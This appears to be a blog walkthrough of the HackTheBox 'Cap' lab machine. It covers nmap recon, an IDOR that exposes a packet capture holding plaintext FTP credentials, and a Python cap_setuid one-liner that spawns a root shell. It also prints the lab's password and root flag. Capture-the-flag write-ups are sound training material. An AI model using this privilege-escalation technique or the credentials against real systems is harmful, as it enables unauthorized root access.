---
title: "Cap"
date: 2025-09-27
slug: "cap"
tags: ["Unrated", "HTB", "Unknown-OS"]
difficulty: "Unrated"
platform: "HTB"
os: "Unknown-OS"
cover: "/images/cap/Pasted image 20250912104505.png"
summary: "Walkthrough of the Cap HTB machine covering recon, exploitation, and privilege escalation."
---
## Recon

```shell
nmap 10.129.126.203    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 10:38 EEST
Nmap scan report for 10.129.126.203
Host is up (0.085s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds

```

```shell
nmap -sV -p 21,22,80 -sC 10.129.126.203 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-12 10:39 EEST
Nmap scan report for 10.129.126.203
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.15 seconds

```

## Web

From netstat page we determine the open ports:

```text
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1001       36738      -                    off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        35942      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          36615      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45310       TIME_WAIT   0          0          -                    timewait (10.34/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:47710       TIME_WAIT   0          0          -                    timewait (10.59/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45268       TIME_WAIT   0          0          -                    timewait (10.40/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:47742       TIME_WAIT   0          0          -                    timewait (10.74/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39080       ESTABLISHED 1001       41811      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38896       FIN_WAIT2   0          0          -                    timewait (56.07/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39024       FIN_WAIT2   0          0          -                    timewait (57.66/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:47740       TIME_WAIT   0          0          -                    timewait (10.59/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38864       FIN_WAIT2   0          0          -                    timewait (53.51/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:36088       FIN_WAIT2   0          0          -                    timewait (47.82/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38910       FIN_WAIT2   0          0          -                    timewait (56.42/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45214       TIME_WAIT   0          0          -                    timewait (10.28/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45298       TIME_WAIT   0          0          -                    timewait (10.20/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:47708       TIME_WAIT   0          0          -                    timewait (10.59/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38970       FIN_WAIT2   0          0          -                    timewait (56.07/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:36102       FIN_WAIT2   0          0          -                    timewait (50.70/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:32970       FIN_WAIT2   0          0          -                    timewait (45.96/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:47696       TIME_WAIT   0          0          -                    timewait (10.72/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39020       FIN_WAIT2   0          0          -                    timewait (56.42/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39114       ESTABLISHED 1001       42380      -                    off (0.00/0/0)
tcp        0      1 10.129.126.203:55016    1.1.1.1:53              SYN_SENT    101        42356      -                    on (1.08/1/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45338       TIME_WAIT   0          0          -                    timewait (10.21/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39098       ESTABLISHED 1001       41809      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45212       TIME_WAIT   0          0          -                    timewait (10.27/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45354       TIME_WAIT   0          0          -                    timewait (10.68/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39066       ESTABLISHED 1001       41808      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39082       ESTABLISHED 1001       41810      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:36072       FIN_WAIT2   0          0          -                    timewait (45.96/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39120       ESTABLISHED 1001       41813      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45284       TIME_WAIT   0          0          -                    timewait (10.21/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39132       ESTABLISHED 1001       42381      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45340       TIME_WAIT   0          0          -                    timewait (10.28/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39076       ESTABLISHED 1001       42377      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38950       FIN_WAIT2   0          0          -                    timewait (56.07/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45324       TIME_WAIT   0          0          -                    timewait (10.28/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:36064       FIN_WAIT2   0          0          -                    timewait (46.98/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:47762       TIME_WAIT   0          0          -                    timewait (10.59/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:47706       TIME_WAIT   0          0          -                    timewait (10.59/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39036       FIN_WAIT2   0          0          -                    timewait (58.70/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38924       FIN_WAIT2   0          0          -                    timewait (56.04/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38908       FIN_WAIT2   0          0          -                    timewait (56.42/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39064       ESTABLISHED 1001       42357      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45352       TIME_WAIT   0          0          -                    timewait (10.45/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38922       FIN_WAIT2   0          0          -                    timewait (56.03/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45350       TIME_WAIT   0          0          -                    timewait (10.38/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:39050       ESTABLISHED 1001       42353      -                    off (0.00/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38964       FIN_WAIT2   0          0          -                    timewait (56.04/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45304       TIME_WAIT   0          0          -                    timewait (10.21/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:47744       TIME_WAIT   0          0          -                    timewait (10.59/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38920       FIN_WAIT2   0          0          -                    timewait (56.42/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45210       TIME_WAIT   0          0          -                    timewait (10.21/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:36110       FIN_WAIT2   0          0          -                    timewait (53.22/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38872       FIN_WAIT2   0          0          -                    timewait (55.04/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:45252       TIME_WAIT   0          0          -                    timewait (10.21/0/0)
tcp        0      0 10.129.126.203:80       10.10.16.46:38880       FIN_WAIT2   0          0          -                    timewait (56.04/0/0)
tcp6       0      0 :::21                   :::*                    LISTEN      0          36603      -                    off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      0          36617      -                    off (0.00/0/0)
udp        0      0 127.0.0.1:48408         127.0.0.53:53           ESTABLISHED 102        42355      -                    off (0.00/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        35941      -                    off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          32367      -                    off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   PID/Program name     Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     27200    -                    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     27184    -                    @/org/kernel/linux/storage/multipathd
unix  3      [ ]         DGRAM                    27168    -                    /run/systemd/notify
unix  2      [ ACC ]     STREAM     LISTENING     27171    -                    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     27173    -                    /run/systemd/userdb/io.systemd.DynamicUser
unix  2      [ ACC ]     STREAM     LISTENING     27182    -                    /run/lvm/lvmpolld.socket
unix  2      [ ]         DGRAM                    27185    -                    /run/systemd/journal/syslog
unix  7      [ ]         DGRAM                    27193    -                    /run/systemd/journal/dev-log
unix  2      [ ACC ]     STREAM     LISTENING     27195    -                    /run/systemd/journal/stdout
unix  8      [ ]         DGRAM                    27197    -                    /run/systemd/journal/socket
unix  2      [ ACC ]     STREAM     LISTENING     32361    -                    /run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     32366    -                    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     32369    -                    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     32371    -                    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     32373    -                    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     32588    -                    /run/irqbalance//irqbalance999.sock
unix  2      [ ACC ]     STREAM     LISTENING     32364    -                    @ISCSIADM_ABSTRACT_NAMESPACE
unix  2      [ ACC ]     STREAM     LISTENING     32365    -                    /var/snap/lxd/common/lxd/unix.socket
unix  2      [ ACC ]     STREAM     LISTENING     27457    -                    /run/systemd/journal/io.systemd.journal
unix  2      [ ]         DGRAM                    37073    -                    
unix  3      [ ]         STREAM     CONNECTED     28341    -                    
unix  3      [ ]         STREAM     CONNECTED     34417    -                    
unix  3      [ ]         DGRAM                    31478    -                    
unix  3      [ ]         STREAM     CONNECTED     32666    -                    
unix  3      [ ]         STREAM     CONNECTED     31328    -                    
unix  3      [ ]         STREAM     CONNECTED     28098    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31729    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     34420    -                    /run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    31477    -                    
unix  3      [ ]         STREAM     CONNECTED     34088    -                    
unix  3      [ ]         STREAM     CONNECTED     35940    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     28064    -                    
unix  2      [ ]         DGRAM                    32081    -                    
unix  3      [ ]         STREAM     CONNECTED     31578    -                    
unix  3      [ ]         STREAM     CONNECTED     34418    -                    
unix  2      [ ]         DGRAM                    32652    -                    
unix  3      [ ]         STREAM     CONNECTED     30372    -                    
unix  3      [ ]         STREAM     CONNECTED     34009    -                    
unix  3      [ ]         STREAM     CONNECTED     28342    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31658    -                    
unix  3      [ ]         STREAM     CONNECTED     35576    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     33850    -                    
unix  3      [ ]         STREAM     CONNECTED     35110    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     35920    -                    
unix  2      [ ]         DGRAM                    35927    -                    
unix  3      [ ]         STREAM     CONNECTED     36105    -                    
unix  2      [ ]         DGRAM                    31474    -                    
unix  3      [ ]         STREAM     CONNECTED     34626    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     35939    -                    
unix  3      [ ]         STREAM     CONNECTED     34419    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     31579    -                    
unix  3      [ ]         STREAM     CONNECTED     31728    -                    
unix  2      [ ]         DGRAM                    32264    -                    
unix  3      [ ]         DGRAM                    31476    -                    
unix  3      [ ]         DGRAM                    31479    -                    
unix  3      [ ]         STREAM     CONNECTED     31389    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     35575    -                    
unix  2      [ ]         DGRAM                    34416    -                    
unix  3      [ ]         STREAM     CONNECTED     35921    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31137    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31134    -                    
unix  3      [ ]         STREAM     CONNECTED     30373    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31388    -                    
unix  3      [ ]         STREAM     CONNECTED     33929    -                    
unix  3      [ ]         STREAM     CONNECTED     35273    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     32719    -                    
unix  3      [ ]         DGRAM                    27621    -                    
unix  3      [ ]         DGRAM                    27620    -                    
unix  3      [ ]         STREAM     CONNECTED     34279    -                    
unix  3      [ ]         DGRAM                    27559    -                    
unix  2      [ ]         DGRAM                    27462    -                    
unix  2      [ ]         DGRAM                    32605    -                    
unix  2      [ ]         DGRAM                    27570    -                    
unix  3      [ ]         STREAM     CONNECTED     35272    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    27615    -                    
unix  3      [ ]         STREAM     CONNECTED     34421    -                    /run/dbus/system_bus_socket
unix  2      [ ]         DGRAM                    35147    -                    
unix  3      [ ]         DGRAM                    27169    -                    
unix  3      [ ]         STREAM     CONNECTED     31329    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     31659    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     34422    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     33930    -                    /run/systemd/journal/stdout
unix  3      [ ]         DGRAM                    27622    -                    
unix  3      [ ]         STREAM     CONNECTED     34737    -                    /run/dbus/system_bus_socket
unix  3      [ ]         DGRAM                    27623    -                    
unix  3      [ ]         STREAM     CONNECTED     34092    -                    /run/systemd/journal/stdout
unix  3      [ ]         STREAM     CONNECTED     34736    -                    
unix  3      [ ]         DGRAM                    27560    -                    
unix  3      [ ]         DGRAM                    27170    -                    
unix  3      [ ]         STREAM     CONNECTED     32723    -                    
unix  3      [ ]         STREAM     CONNECTED     35263    -                    
unix  3      [ ]         STREAM     CONNECTED     35264    1839/sh              
unix  3      [ ]         STREAM     CONNECTED     34767    -                    /run/dbus/system_bus_socket
unix  3      [ ]         STREAM     CONNECTED     32385    -                    
unix  3      [ ]         STREAM     CONNECTED     32722    -                    
unix  3      [ ]         STREAM     CONNECTED     34011    -                    /run/systemd/journal/stdout
unix  2      [ ]         DGRAM                    27557    -                    
unix  3      [ ]         STREAM     CONNECTED     33855    -                    /run/systemd/journal/stdout
```

This endpoint seemed most interesting: `http://10.129.126.203/data/1`, when I changed the id to 0 the data changed

![cap-1](/images/cap/Pasted image 20250912104505.png)

which makes the application vulnerable to IDOR. I will bruteforce the IDs in Burp Intruder and check what are valid IDs

![cap-2](/images/cap/Pasted image 20250912104544.png)

so 0 and 1 are valid, download the pcaps from each and see

From 1, the pcap is filled with SYN and RST,ACK packets and there is no actual data in the pcap

From 0, there is clear evidence of communication to HTTP server where a user is viewing a website at 192.168.196.16, they visited:
- / -> 200 ok response
- /static/main.css -> 200 ok response
- /favicon.ico -> 404 not found

and then I found FTP connection so I clicked on the SYN packet to port 21 and then followed TCP stream in wireshark and found this:

```text
220 (vsFTPd 3.0.3)

  

USER nathan

  

331 Please specify the password.

  

PASS Buck3tH4TF0RM3!

  

230 Login successful.

  

SYST

  

215 UNIX Type: L8

  

PORT 192,168,196,1,212,140

  

200 PORT command successful. Consider using PASV.

  

LIST

  

150 Here comes the directory listing.

226 Directory send OK.

  

PORT 192,168,196,1,212,141

  

200 PORT command successful. Consider using PASV.

  

LIST -al

  

150 Here comes the directory listing.

226 Directory send OK.

  

TYPE I

  

200 Switching to Binary mode.

  

PORT 192,168,196,1,212,143

  

200 PORT command successful. Consider using PASV.

  

RETR notes.txt

  

550 Failed to open file.

  

QUIT

  

221 Goodbye.
```

so we have a user I will try to FTP with the user creds and check what is their

## Obtaining User Flag

FTP to the server with creds: nathan:Buck3tH4TF0RM3!

```shell
tp 10.129.126.203                                                                                             
Connected to 10.129.126.203.
220 (vsFTPd 3.0.3)
Name (10.129.126.203:husmal): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help
Commands may be abbreviated.  Commands are:

!               case            dir             fget            idle            mdelete         modtime         ntrans          progress        rcvbuf          rmdir           sndbuf          type
$               cd              disconnect      form            image           mdir            more            open            prompt          recv            rstatus         status          umask
account         cdup            edit            ftp             lcd             mget            mput            page            proxy           reget           runique         struct          unset
append          chmod           epsv            gate            less            mkdir           mreget          passive         put             remopts         send            sunique         usage
ascii           close           epsv4           get             lpage           mls             msend           pdir            pwd             rename          sendport        system          user
bell            cr              epsv6           glob            lpwd            mlsd            newer           pls             quit            reset           set             tenex           verbose
binary          debug           exit            hash            ls              mlst            nlist           pmlsd           quote           restart         site            throttle        xferbuf
bye             delete          features        help            macdef          mode            nmap            preserve        rate            rhelp           size            trace           ?
ftp> ls
229 Entering Extended Passive Mode (|||29355|)
150 Here comes the directory listing.
-r--------    1 1001     1001           33 Sep 12 07:37 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||15934|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |***********************************************************************************************************************************************************************************************|    33        1.92 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.14 KiB/s)
ftp> 

```

we get user flag this way or we can simply ssh with nathan creds

## Obtaining Root flag

```shell
sudo -l
[sudo] password for nathan: 
Sorry, user nathan may not run sudo on cap.
```

Run linpeas and cherry pick what is interesting

```ssh
══╣ Polkit Binary
Pkexec binary found at: /usr/bin/pkexec                                                                                                                                                                                                     
Pkexec binary has SUID bit set!
-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec
pkexec version 0.105

╔══════════╣ Analyzing FTP Files (limit 70)
-rw-r--r-- 1 root root 5850 Mar  6  2019 /etc/vsftpd.conf                                                                                                                                                                                   
anonymous_enable
local_enable=YES
#write_enable=YES
#anon_upload_enable=YES
#anon_mkdir_write_enable=YES
#chown_uploads=YES
#chown_username=whoever
-rw-r--r-- 1 root root 41 Jun 18  2015 /usr/lib/tmpfiles.d/vsftpd.conf
-rw-r--r-- 1 root root 506 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf
anonymous_enable
local_enable
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable
-rw-r--r-- 1 root root 564 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf
anonymous_enable
local_enable
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable
-rw-r--r-- 1 root root 260 Feb  2  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf
anonymous_enable
local_enable=YES
write_enable
anon_upload_enable
anon_mkdir_write_enable
anon_other_write_enable


/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

Vulnerable to CVE-2021-3560
```

using this `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip` looks promising

The privileges provided to the python3.8 binary mean:
- cap_setuid: It can change the user ID process
- cap_net_bind_service: The binary can bind to ports < 1024.
- +eip : 
	- e = Effective -> the capability is in effect when the binary runs.
	- i = Inheritable -> can be inherited across exec.
	- p = Permitted -> the capability is permitted to be used.

To exploit I will try and run this one-liner:

```shell
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```shell
nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# whoami /priv
whoami: extra operand ‘/priv’
Try 'whoami --help' for more information.
root@cap:~# ls /root
root.txt  snap
root@cap:~# cat /root/root.txt
c521a987c56f071b47fdf84d4c5ff796
root@cap:~# 

```

too easy
